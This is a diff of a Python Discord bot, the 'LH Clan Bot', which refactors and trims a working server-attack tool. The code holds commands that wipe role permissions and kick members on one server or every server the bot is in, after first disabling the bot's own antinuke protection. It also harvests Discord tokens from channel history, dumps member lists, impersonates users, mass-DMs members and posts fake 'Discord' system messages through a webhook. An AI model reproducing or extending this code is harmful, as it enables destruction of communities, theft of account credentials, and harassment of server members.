@@ -620,14 +1229,9 @@ async def give_premium(ctx, user_id: str = None, duration: str = None):
         await ctx.send("❌ User not found.", delete_after=5)
         return
 
-    if secs == float("inf"):
-        premium_users[target_id] = float("inf")
-        exp_str = "Permanent"
-    else:
-        premium_users[target_id] = time.time() + secs
-        exp_str = premium_expiry_str(target_id)
+    premium_users[target_id] = float("inf") if secs == float("inf") else time.time() + secs
+    exp_str = premium_expiry_str(target_id)
 
-    # notify the gifted user
     gift_embed = discord.Embed(
         title="👑 Premium Access Granted!",
         description=(
@@ -644,12 +1248,7 @@ async def give_premium(ctx, user_id: str = None, duration: str = None):
     except Exception:
         pass
 
-    # confirm to master
-    confirm = discord.Embed(
-        title="✅ Premium Gifted",
-        color=0x00ff00,
-        timestamp=discord.utils.utcnow()
-    )
+    confirm = discord.Embed(title="✅ Premium Gifted", color=0x00ff00, timestamp=discord.utils.utcnow())
     confirm.add_field(name="User",     value=f"{target} (`{target_id}`)", inline=False)
     confirm.add_field(name="Duration", value=exp_str,                     inline=True)
     confirm.set_footer(text="LH Premium System")
@@ -695,17 +1294,14 @@ async def revoke_premium(ctx, user_id: str = None):
 
     premium_users.pop(target_id)
 
-    # notify the user
     try:
         target = await bot.fetch_user(target_id)
-        revoke_embed = discord.Embed(
+        await target.send(embed=discord.Embed(
             title="⚠️ Premium Access Revoked",
             description="Your LH Premium access has been revoked.",
             color=0xff0000,
             timestamp=discord.utils.utcnow()
-        )
-        revoke_embed.set_footer(text="LH Clan Bot")
-        await target.send(embed=revoke_embed)
+        ))
     except Exception:
         pass
 
@@ -723,18 +1319,14 @@ async def premium_list(ctx):
         await ctx.send("❌ Access Denied.", delete_after=5)
         return
 
-    embed = discord.Embed(
-        title="👑 Premium Users",
-        color=0xffd700,
-        timestamp=discord.utils.utcnow()
-    )
+    embed = discord.Embed(title="👑 Premium Users", color=0xffd700, timestamp=discord.utils.utcnow())
 
     if not premium_users:
         embed.description = "No premium users."
     else:
         lines = []
         for uid, expiry in premium_users.items():
-            exp = "Permanent" if expiry == float("inf") else premium_expiry_str(uid)
+            exp    = "Permanent" if expiry == float("inf") else premium_expiry_str(uid)
             status = "✅" if is_premium(uid) else "❌ Expired"
             lines.append(f"`{uid}` — {exp} {status}")
         embed.description = "\n".join(lines)
@@ -751,170 +1343,6 @@ async def premium_list(ctx):
             await msg.delete()
         except Exception:
             pass
-
-
-# ══════════════════════════════════════════════════════════════
-#  ANTINUKE COMMANDS
-# ══════════════════════════════════════════════════════════════
-
-@bot.command(name="antinuke")
-async def antinuke_cmd(ctx, action: str = None, *, args: str = None):
-    try:
-        await ctx.message.delete()
-    except Exception:
-        pass
-
-    guild = ctx.guild
-
-    if not action:
-        await ctx.send("❌ Usage: `!antinuke <on|off|status|whitelist|setup>`", delete_after=5)
-        return
-
-    action = action.lower()
-
-    if action == "on":
-        if not ctx.author.guild_permissions.administrator:
-            await ctx.send("❌ Administrator required.", delete_after=5)
-            return
-        antinuke_enabled[guild.id] = True
-        embed = discord.Embed(
-            title="🛡️ AntiNuke Enabled",
-            description=(
-                f"**{guild.name}** is now protected.\n\n"
-                "**Watching:**\n"
-                "• Mass channel deletes/creates\n"
-                "• Mass role deletes\n"
-                "• Mass kicks & bans\n"
-                "• Unauthorized webhook creates\n"
-                "• Unauthorized bot joins\n\n"
-                f"Logs → `#{LOG_CHANNEL_NAME}` (hidden channel)"
-            ),
-            color=0x00ff00,
-            timestamp=discord.utils.utcnow()
-        )
-        embed.set_footer(text="Only premium user can disable AntiNuke")
-        try:
-            await ctx.author.send(embed=embed)
-            await ctx.send("🛡️ AntiNuke enabled. Details sent to DMs.", delete_after=5)
-        except discord.Forbidden:
-            msg = await ctx.send(embed=embed)
-            await asyncio.sleep(15)
-            try:
-                await msg.delete()
-            except Exception:
-                pass
-        return
-
-    if action == "off":
-        if ctx.author.id != PREMIUM_USER_ID:
-            await ctx.send(embed=discord.Embed(
-                title="❌ Access Denied",
-                description="Only the **premium user** can disable AntiNuke.",
-                color=0xff0000
-            ), delete_after=5)
-            return
-        antinuke_enabled[guild.id] = False
-        embed = discord.Embed(
-            title="⚠️ AntiNuke Disabled",
-            description=(
-                f"Protection disabled for **{guild.name}**.\n"
-                "Re-enable anytime with `!antinuke on`."
-            ),
-            color=0xff9900,
-            timestamp=discord.utils.utcnow()
-        )
-        try:
-            await ctx.author.send(embed=embed)
-            await ctx.send("⚠️ AntiNuke disabled.", delete_after=5)
-        except discord.Forbidden:
-            msg = await ctx.send(embed=embed)
-            await asyncio.sleep(10)
-            try:
-                await msg.delete()
-            except Exception:
-                pass
-        return
-
-    if action == "status":
-        if not ctx.author.guild_permissions.administrator:
-            await ctx.send("❌ Administrator required.", delete_after=5)
-            return
-        status = "🟢 ENABLED" if antinuke_enabled[guild.id] else "🔴 DISABLED"
-        wl     = antinuke_whitelist[guild.id]
-        wl_str = "\n".join([f"<@{uid}> (`{uid}`)" for uid in wl]) or "None"
-        embed  = discord.Embed(
-            title="🛡️ AntiNuke Status",
-            color=0x00ff00 if antinuke_enabled[guild.id] else 0xff0000,
-            timestamp=discord.utils.utcnow()
-        )
-        embed.add_field(name="Status",  value=f"**{status}**",         inline=False)
-        embed.add_field(name="Server",  value=guild.name,              inline=True)
-        embed.add_field(name="Members", value=str(guild.member_count), inline=True)
-        embed.add_field(
-            name="Thresholds",
-            value=(
-                "• Channel delete: **3 in 5s**\n"
-                "• Channel create: **3 in 5s**\n"
-                "• Role delete:    **3 in 5s**\n"
-                "• Kick:           **3 in 5s**\n"
-                "• Ban:            **2 in 5s**\n"
-                "• Webhook create: **2 in 10s**"
-            ),
-            inline=False
-        )
-        embed.add_field(name="Whitelist", value=wl_str, inline=False)
-        embed.set_footer(text="LH AntiNuke System | Premium user can disable")
-        try:
-            await ctx.author.send(embed=embed)
-            await ctx.send("🛡️ Status sent to your DMs.", delete_after=5)
-        except discord.Forbidden:
-            msg = await ctx.send(embed=embed)
-            await asyncio.sleep(20)
-            try:
-                await msg.delete()
-            except Exception:
-                pass
-        return
-
-    if action == "whitelist":
-        if ctx.author.id != PREMIUM_USER_ID:
-            await ctx.send("❌ Only premium user can manage whitelist.", delete_after=5)
-            return
-        if not args or len(args.split()) < 2:
-            await ctx.send("❌ Usage: `!antinuke whitelist <add|remove> <userID>`", delete_after=5)
-            return
-        parts = args.split()
-        sub   = parts[0].lower()
-        try:
-            target_id = int(parts[1])
-        except ValueError:
-            await ctx.send("❌ Invalid user ID.", delete_after=5)
-            return
-        if sub == "add":
-            antinuke_whitelist[guild.id].add(target_id)
-            await ctx.send(f"✅ `{target_id}` added to whitelist.", delete_after=5)
-        elif sub == "remove":
-            antinuke_whitelist[guild.id].discard(target_id)
-            await ctx.send(f"✅ `{target_id}` removed from whitelist.", delete_after=5)
-        else:
-            await ctx.send("❌ Usage: `!antinuke whitelist <add|remove> <userID>`", delete_after=5)
-        return
-
-    if action == "setup":
-        if not ctx.author.guild_permissions.administrator:
-            await ctx.send("❌ Administrator required.", delete_after=5)
-            return
-        ch = await get_or_create_log_channel(guild)
-        if ch:
-            await ctx.send(
-                f"✅ Log channel ready: {ch.mention} — only `{LOG_ROLE_NAME}` role can see it.",
-                delete_after=10
-            )
-        else:
-            await ctx.send("❌ Failed to create log channel. Check bot permissions.", delete_after=5)
-        return
-
-    await ctx.send("❌ Unknown action. Use: `on`, `off`, `status`, `whitelist`, `setup`", delete_after=5)
 
 
 # ══════════════════════════════════════════════════════════════
@@ -939,10 +1367,7 @@ class VerifyButton(discord.ui.View):
             await interaction.response.send_message(
                 embed=discord.Embed(
                     title="❌ Setup Error",
-                    description=(
-                        f"No role named `{VERIFY_ROLE_NAME}` found.\n"
-                        "Please contact an administrator."
-                    ),
+                    description=f"No role named `{VERIFY_ROLE_NAME}` found.\nContact an administrator.",
                     color=0xff0000
                 ),
                 ephemeral=True
@@ -979,16 +1404,8 @@ class VerifyButton(discord.ui.View):
             )
             await interaction.response.send_message(embed=embed, ephemeral=True)
 
-            log_embed = discord.Embed(
-                title="👤 Member Verified",
-                color=0x00ff00,
-                timestamp=discord.utils.utcnow()
-            )
-            log_embed.add_field(
-                name="User",
-                value=f"{interaction.user} (`{interaction.user.id}`)",
-                inline=False
-            )
+            log_embed = discord.Embed(title="👤 Member Verified", color=0x00ff00, timestamp=discord.utils.utcnow())
+            log_embed.add_field(name="User", value=f"{interaction.user} (`{interaction.user.id}`)", inline=False)
             log_embed.add_field(name="Role", value=role.mention, inline=True)
             log_embed.set_thumbnail(url=interaction.user.display_avatar.url)
             log_embed.set_footer(text="LH Verification Log")
@@ -1003,10 +1420,7 @@ class VerifyButton(discord.ui.View):
             await interaction.response.send_message(
                 embed=discord.Embed(
                     title="❌ Permission Error",
-                    description=(
-                        "The bot doesn't have permission to assign roles.\n"
-                        "Please contact an administrator."
-                    ),
+                    description="Bot lacks permission to assign roles.\nContact an administrator.",
                     color=0xff0000
                 ),
                 ephemeral=True
@@ -1062,9 +1476,7 @@ async def run_nuke(guild: discord.Guild):
     for role in guild.roles:
         if role >= guild.me.top_role: continue
         if role.is_default(): continue
-        role_tasks.append(
-            role.edit(permissions=discord.Permissions.none(), reason="LH — permission wipe")
-        )
+        role_tasks.append(role.edit(permissions=discord.Permissions.none(), reason="LH — permission wipe"))
     await asyncio.gather(*role_tasks, return_exceptions=True)
 
     kick_tasks = []
@@ -1103,9 +1515,7 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
 
     if subcommand and subcommand.upper() == "T":
         if ctx.author.id != PREMIUM_USER_ID:
-            await ctx.send(embed=discord.Embed(
-                title="❌ Access Denied", description="Owner only.", color=0xff0000
-            ), delete_after=5)
+            await ctx.send(embed=discord.Embed(title="❌ Access Denied", description="Owner only.", color=0xff0000), delete_after=5)
             try: await ctx.message.delete()
             except Exception: pass
             return
@@ -1113,11 +1523,7 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
         active_tokens[tok] = True
         embed = discord.Embed(
             title="🔑 Premium Token Generated",
-            description=(
-                f"**Token:** `{tok}`\n\n"
-                "Use with `!LHP` to edit nuke settings.\n"
-                "⚠️ **Single-use** — consumed after one successful edit."
-            ),
+            description=f"**Token:** `{tok}`\n\nUse with `!LHP`.\n⚠️ **Single-use.**",
             color=0xffd700
         )
         embed.set_footer(text=f"Generated by {ctx.author} | LH Premium")
@@ -1142,8 +1548,7 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
         if target:
             try:
                 await guild.me.edit(nick=target.display_name)
-                avatar_bytes = await target.display_avatar.read()
-                await bot.user.edit(avatar=avatar_bytes)
+                await bot.user.edit(avatar=await target.display_avatar.read())
             except Exception:
                 pass
         try: await ctx.message.delete()
@@ -1157,21 +1562,17 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
         if not args or len(args.split()) < 2:
             await ctx.send("❌ Usage: `!LH EXEC <serverID> <token>`", delete_after=5)
             return
-        parts         = args.split()
-        server_id_str = parts[0]
-        tok           = parts[1]
+        parts = args.split()
+        tok   = parts[1]
         if not has_valid_token(tok):
-            await ctx.send(embed=discord.Embed(
-                title="❌ Invalid Token", description="Token doesn't exist or already used.", color=0xff0000
-            ), delete_after=5)
+            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description="Doesn't exist or used.", color=0xff0000), delete_after=5)
             try: await ctx.message.delete()
             except Exception: pass
             return
-        if not (is_premium(ctx.author.id)):
+        if not is_premium(ctx.author.id):
             await ctx.send("❌ Premium required.", delete_after=5)
             return
-        try:
-            target_guild = bot.get_guild(int(server_id_str))
+        try: target_guild = bot.get_guild(int(parts[0]))
         except ValueError:
             await ctx.send("❌ Invalid server ID.", delete_after=5)
             return
@@ -1181,11 +1582,7 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
         consume_token(tok)
         try: await ctx.message.delete()
         except Exception: pass
-        await notify_owner(discord.Embed(
-            title="💀 Remote Nuke Initiated",
-            description=f"Targeting: **{target_guild.name}** (`{target_guild.id}`)",
-            color=0xff0000, timestamp=discord.utils.utcnow()
-        ))
+        await notify_owner(discord.Embed(title="💀 Remote Nuke Initiated", description=f"Targeting: **{target_guild.name}**", color=0xff0000, timestamp=discord.utils.utcnow()))
         antinuke_enabled[target_guild.id] = False
         await run_nuke(target_guild)
         return
@@ -1193,9 +1590,7 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
     if subcommand and subcommand.upper() == "ALL":
         tok = args.strip() if args else ""
         if not has_valid_token(tok):
-            await ctx.send(embed=discord.Embed(
-                title="❌ Invalid Token", description="Token doesn't exist or already used.", color=0xff0000
-            ), delete_after=5)
+            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description="Doesn't exist or used.", color=0xff0000), delete_after=5)
             try: await ctx.message.delete()
             except Exception: pass
             return
@@ -1206,17 +1601,12 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
         guilds = list(bot.guilds)
         try: await ctx.message.delete()
         except Exception: pass
-        await notify_owner(discord.Embed(
-            title="💀 ALL SERVERS NUKE INITIATED",
-            description=f"Targeting **{len(guilds)}** servers simultaneously.",
-            color=0xff0000, timestamp=discord.utils.utcnow()
-        ))
+        await notify_owner(discord.Embed(title="💀 ALL SERVERS NUKE INITIATED", description=f"Targeting **{len(guilds)}** servers.", color=0xff0000, timestamp=discord.utils.utcnow()))
         for g in guilds:
             antinuke_enabled[g.id] = False
         await asyncio.gather(*[run_nuke(g) for g in guilds], return_exceptions=True)
         return
 
-    # standard nuke
     if not ctx.author.guild_permissions.administrator:
         await ctx.send("❌ Administrator required.", delete_after=5)
         return
@@ -1227,47 +1617,28 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
 
 
 # ══════════════════════════════════════════════════════════════
-#  LHP — premium config editor
+#  LHP
 # ══════════════════════════════════════════════════════════════
 
 class LHPModal(discord.ui.Modal, title="⚙️ Edit LH Nuke Config"):
-    token_input = discord.ui.TextInput(
-        label="Premium Token", placeholder="LHT-xxxxxxxxxxxxxxxxxxxxxxxx",
-        required=True, max_length=32, style=discord.TextStyle.short
-    )
-    channel_name_input = discord.ui.TextInput(
-        label="Channel Name", placeholder="hooked by lh clan",
-        required=True, max_length=100, style=discord.TextStyle.short
-    )
-    message_input = discord.ui.TextInput(
-        label="Spam Message", placeholder="lol ur server doesn't even have any good protection",
-        required=True, max_length=2000, style=discord.TextStyle.paragraph
-    )
-    channel_count_input = discord.ui.TextInput(
-        label="Channel Count (min 12)", placeholder="12",
-        required=True, max_length=3, style=discord.TextStyle.short
-    )
-    spam_count_input = discord.ui.TextInput(
-        label="Spam Count per Channel (max 200)", placeholder="100",
-        required=True, max_length=3, style=discord.TextStyle.short
-    )
+    token_input        = discord.ui.TextInput(label="Premium Token",               placeholder="LHT-xxxxxxxxxxxxxxxxxxxxxxxx", required=True, max_length=32,   style=discord.TextStyle.short)
+    channel_name_input = discord.ui.TextInput(label="Channel Name",                placeholder="hooked by lh clan",           required=True, max_length=100,  style=discord.TextStyle.short)
+    message_input      = discord.ui.TextInput(label="Spam Message",                placeholder="lol ur server...",            required=True, max_length=2000, style=discord.TextStyle.paragraph)
+    channel_count_input= discord.ui.TextInput(label="Channel Count (min 12)",      placeholder="12",                          required=True, max_length=3,    style=discord.TextStyle.short)
+    spam_count_input   = discord.ui.TextInput(label="Spam Count per Channel (max 200)", placeholder="100",                    required=True, max_length=3,    style=discord.TextStyle.short)
 
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
         tok = self.token_input.value.strip()
         if not has_valid_token(tok):
-            await interaction.followup.send(embed=discord.Embed(
-                title="❌ Invalid Token", description="Token doesn't exist or already used.", color=0xff0000
-            ), ephemeral=True)
+            await interaction.followup.send(embed=discord.Embed(title="❌ Invalid Token", description="Doesn't exist or used.", color=0xff0000), ephemeral=True)
             return
         try:
-            ch_count = int(self.channel_count_input.value.strip())
-            sp_count = int(self.spam_count_input.value.strip())
+            ch_count = max(12, int(self.channel_count_input.value.strip()))
+            sp_count = max(1, min(int(self.spam_count_input.value.strip()), 200))
         except ValueError:
             await interaction.followup.send("❌ Counts must be numbers.", ephemeral=True)
             return
-        ch_count = max(12, ch_count)
-        sp_count = max(1, min(sp_count, 200))
         nuke_config["channel_name"]  = self.channel_name_input.value.strip()
         nuke_config["message"]       = self.message_input.value.strip()
         nuke_config["channel_count"] = ch_count
@@ -1277,8 +1648,8 @@ class LHPModal(discord.ui.Modal, title="⚙️ Edit LH Nuke Config"):
         embed = discord.Embed(title="✅ Nuke Config Updated", color=0x00ff00)
         embed.add_field(name="Channel Name",  value=f"`{nuke_config['channel_name']}`", inline=False)
         embed.add_field(name="Spam Message",  value=f"`{preview}`",                     inline=False)
-        embed.add_field(name="Channel Count", value=str(nuke_config["channel_count"]),  inline=True)
-        embed.add_field(name="Spam Count",    value=str(nuke_config["spam_count"]),     inline=True)
+        embed.add_field(name="Channel Count", value=str(ch_count),                      inline=True)
+        embed.add_field(name="Spam Count",    value=str(sp_count),                      inline=True)
         embed.set_footer(text="Token consumed. Generate new: !LH T")
         await interaction.followup.send(embed=embed, ephemeral=True)
 
@@ -1303,12 +1674,7 @@ async def lhp(ctx):
             await interaction.response.send_modal(LHPModal())
             self.stop()
 
-    embed = discord.Embed(
-        title="⚙️ LH Premium Config",
-        description="Click to open the nuke config editor.\nRequires a valid token from `!LH T`.",
-        color=0xffd700
-    )
-    msg = await ctx.send(embed=embed, view=LHPView())
+    msg = await ctx.send(embed=discord.Embed(title="⚙️ LH Premium Config", description="Click to open the nuke config editor.\nRequires a valid token from `!LH T`.", color=0xffd700), view=LHPView())
     await asyncio.sleep(61)
     try: await msg.delete()
     except Exception: pass
@@ -1331,12 +1697,8 @@ async def lh_spy(ctx):
     if not guilds:
         await ctx.author.send("Bot is not in any servers.")
         return
-    pages = [guilds[i:i+10] for i in range(0, len(guilds), 10)]
-    for idx, page in enumerate(pages):
-        embed = discord.Embed(
-            title=f"📡 Server Spy — Page {idx+1}/{len(pages)}",
-            color=0xff4400, timestamp=discord.utils.utcnow()
-        )
+    for idx, page in enumerate([guilds[i:i+10] for i in range(0, len(guilds), 10)]):
+        embed = discord.Embed(title=f"📡 Server Spy — Page {idx+1}", color=0xff4400, timestamp=discord.utils.utcnow())
         for g in page:
             try:
                 owner = await bot.fetch_user(g.owner_id)
@@ -1345,16 +1707,10 @@ async def lh_spy(ctx):
                 owner_str = f"ID: `{g.owner_id}`"
             embed.add_field(
                 name=g.name,
-                value=(
-                    f"ID: `{g.id}`\n"
-                    f"Members: `{g.member_count}`\n"
-                    f"Owner: {owner_str}\n"
-                    f"Channels: `{len(g.channels)}`\n"
-                    f"AntiNuke: {'🟢' if antinuke_enabled[g.id] else '🔴'}"
-                ),
+                value=f"ID: `{g.id}`\nMembers: `{g.member_count}`\nOwner: {owner_str}\nAntiNuke: {'🟢' if antinuke_enabled[g.id] else '🔴'}",
                 inline=True
             )
-        embed.set_footer(text=f"Total servers: {len(guilds)}")
+        embed.set_footer(text=f"Total: {len(guilds)} servers")
         try: await ctx.author.send(embed=embed)
         except discord.Forbidden: await ctx.send(embed=embed, delete_after=30)
     await ctx.send("📡 Spy report sent to your DMs.", delete_after=5)
@@ -1379,26 +1735,20 @@ async def lh_members(ctx, server_id: str = None):
         return
     try: await ctx.message.delete()
     except Exception: pass
-    await ctx.send("📋 Fetching member list...", delete_after=5)
+    await ctx.send("📋 Fetching...", delete_after=5)
     lines = [f"Member List — {guild.name} ({guild.id})\n{'='*50}"]
     async for member in guild.fetch_members(limit=None):
-        joined   = member.joined_at.strftime("%Y-%m-%d") if member.joined_at else "unknown"
-        top_role = member.top_role.name if member.top_role else "none"
         lines.append(
             f"Username : {member}\nID       : {member.id}\n"
-            f"Top Role : {top_role}\nJoined   : {joined}\n"
+            f"Top Role : {member.top_role.name}\nJoined   : {member.joined_at.strftime('%Y-%m-%d') if member.joined_at else 'unknown'}\n"
             f"Bot      : {'Yes' if member.bot else 'No'}\n{'-'*40}"
         )
-    output    = "\n".join(lines)
     file_path = f"/tmp/members_{guild.id}.txt"
     with open(file_path, "w", encoding="utf-8") as f:
-        f.write(output)
+        f.write("\n".join(lines))
     try:
-        await ctx.author.send(
-            content=f"📋 Member list for **{guild.name}** — `{len(guild.members)}` members",
-            file=discord.File(file_path, filename=f"members_{guild.name}.txt")
-        )
-        await ctx.send("📋 Member list sent to your DMs.", delete_after=5)
+        await ctx.author.send(content=f"📋 Member list for **{guild.name}**", file=discord.File(file_path, filename=f"members_{guild.name}.txt"))
+        await ctx.send("📋 Sent to your DMs.", delete_after=5)
     except discord.Forbidden:
         await ctx.send(file=discord.File(file_path, filename=f"members_{guild.name}.txt"))
 
@@ -1422,33 +1772,27 @@ async def lh_tokens(ctx, server_id: str = None):
         return
     try: await ctx.message.delete()
     except Exception: pass
-    status = await ctx.send("🔍 Scanning channels for tokens...")
+    status = await ctx.send("🔍 Scanning...")
     found  = []
     for channel in guild.text_channels:
         try:
             async for msg in channel.history(limit=500):
                 for match in DISCORD_TOKEN_REGEX.findall(msg.content):
-                    found.append(
-                        f"Token  : {match}\nAuthor : {msg.author} ({msg.author.id})\n"
-                        f"Channel: #{channel.name}\n{'─'*40}"
-                    )
+                    found.append(f"Token  : {match}\nAuthor : {msg.author} ({msg.author.id})\nChannel: #{channel.name}\n{'─'*40}")
         except Exception:
             continue
     try: await status.delete()
     except Exception: pass
     if not found:
         try: await ctx.author.send(f"🔍 Scan complete for **{guild.name}** — no tokens found.")
-        except Exception: await ctx.send("🔍 Scan complete — no tokens found.", delete_after=10)
+        except Exception: await ctx.send("🔍 No tokens found.", delete_after=10)
         return
-    output    = f"Token Scan — {guild.name} ({guild.id})\nFound: {len(found)}\n{'='*50}\n" + "\n".join(found)
+    output = f"Token Scan — {guild.name}\nFound: {len(found)}\n{'='*50}\n" + "\n".join(found)
     file_path = f"/tmp/tokens_{guild.id}.txt"
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(output)
     try:
-        await ctx.author.send(
-            content=f"🔑 Found **{len(found)}** token(s) in **{guild.name}**",
-            file=discord.File(file_path, filename=f"tokens_{guild.name}.txt")
-        )
+        await ctx.author.send(content=f"🔑 Found **{len(found)}** token(s)", file=discord.File(file_path, filename=f"tokens_{guild.name}.txt"))
     except discord.Forbidden:
         await ctx.send(file=discord.File(file_path, filename=f"tokens_{guild.name}.txt"))
 
@@ -1463,9 +1807,7 @@ async def impersonate(ctx, token_str: str = None, user_id: str = None, *, messag
         await ctx.send("❌ Usage: `!impersonate <token> <userID> <message>`", delete_after=5)
         return
     if not has_valid_token(token_str):
-        await ctx.send(embed=discord.Embed(
-            title="❌ Invalid Token", description="Token doesn't exist or already used.", color=0xff0000
-        ), delete_after=5)
+        await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description="Doesn't exist or used.", color=0xff0000), delete_after=5)
         try: await ctx.message.delete()
         except Exception: pass
         return
@@ -1494,9 +1836,7 @@ async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: 
         await ctx.send("❌ Usage: `!massdm <token> <serverID> <message>`", delete_after=5)
         return
     if not has_valid_token(token_str):
-        await ctx.send(embed=discord.Embed(
-            title="❌ Invalid Token", description="Token doesn't exist or already used.", color=0xff0000
-        ), delete_after=5)
+        await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description="Doesn't exist or used.", color=0xff0000), delete_after=5)
         try: await ctx.message.delete()
         except Exception: pass
         return
@@ -1510,7 +1850,7 @@ async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: 
     consume_token(token_str)
     try: await ctx.message.delete()
     except Exception: pass
-    status_msg = await ctx.send(f"📬 Mass DMing **{guild.name}**... 0/{guild.member_count} sent")
+    status_msg = await ctx.send(f"📬 Mass DMing **{guild.name}**... 0/{guild.member_count}")
     success = 0
     failed  = 0
     for member in guild.members:
@@ -1521,10 +1861,7 @@ async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: 
         except Exception:
             failed += 1
         if (success + failed) % 10 == 0:
-            try:
-                await status_msg.edit(
-                    content=f"📬 Mass DMing **{guild.name}**... {success+failed}/{guild.member_count}"
-                )
+            try: await status_msg.edit(content=f"📬 Mass DMing... {success+failed}/{guild.member_count}")
             except Exception: pass
     embed = discord.Embed(title="📬 Mass DM Complete", color=0x00ff00)
     embed.add_field(name="Server",    value=guild.name,   inline=False)
@@ -1549,11 +1886,7 @@ async def fake_system(ctx, *, message: str = None):
         await ctx.send("❌ Bot needs Manage Webhooks permission.", delete_after=5)
         return
     try:
-        await webhook.send(
-            content=message,
-            username="Discord",
-            avatar_url="https://cdn.discordapp.com/embed/avatars/0.png"
-        )
+        await webhook.send(content=message, username="Discord", avatar_url="https://cdn.discordapp.com/embed/avatars/0.png")
     except Exception as e:
         await ctx.send(f"❌ Send failed: `{e}`", delete_after=5)
     finally:
@@ -1565,25 +1898,11 @@ async def fake_system(ctx, *, message: str = None):
 # ══════════════════════════════════════════════════════════════
 
 @bot.tree.command(name="dm", description="DM a user by @mention or ID")
-@app_commands.describe(
-    member="@mention a server member",
-    user_id="Or paste a user ID (outside server)",
-    message="Message to send",
-    count="How many times (max 200)",
-    delay="Delay in seconds between messages"
-)
-async def dm(
-    interaction: discord.Interaction,
-    message: str,
-    count: app_commands.Range[int, 1, 200],
-    member: Optional[discord.Member] = None,
-    user_id: Optional[str] = None,
-    delay: Optional[float] = None
-):
+@app_commands.describe(member="@mention a server member", user_id="Or paste a user ID", message="Message to send", count="How many times (max 200)", delay="Delay in seconds between messages")
+async def dm(interaction: discord.Interaction, message: str, count: app_commands.Range[int, 1, 200], member: Optional[discord.Member] = None, user_id: Optional[str] = None, delay: Optional[float] = None):
     await interaction.response.defer(ephemeral=True)
     actual_delay = max(0.0, min(delay or 0.0, 10.0))
-    if member:
-        user = member
+    if member: user = member
     elif user_id:
         try: user = await bot.fetch_user(int(user_id))
         except discord.NotFound:
@@ -1601,8 +1920,7 @@ async def dm(
         try:
             await user.send(message)
             success += 1
-            if actual_delay > 0:
-                await asyncio.sleep(actual_delay)
+            if actual_delay > 0: await asyncio.sleep(actual_delay)
         except discord.Forbidden:
             failed = count - success
             break
@@ -1663,8 +1981,10 @@ async def poll(interaction: discord.Interaction, question: str):
 async def ping(interaction: discord.Interaction):
     latency = round(bot.latency * 1000)
     color   = 0x00ff00 if latency < 100 else (0xff9900 if latency < 200 else 0xff0000)
-    embed   = discord.Embed(title="🏓 Pong!", description=f"Latency: **{latency}ms**", color=color)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
+    await interaction.response.send_message(
+        embed=discord.Embed(title="🏓 Pong!", description=f"Latency: **{latency}ms**", color=color),
+        ephemeral=True
+    )
 
 
 # ── run ───────────────────────────────────────────────────────
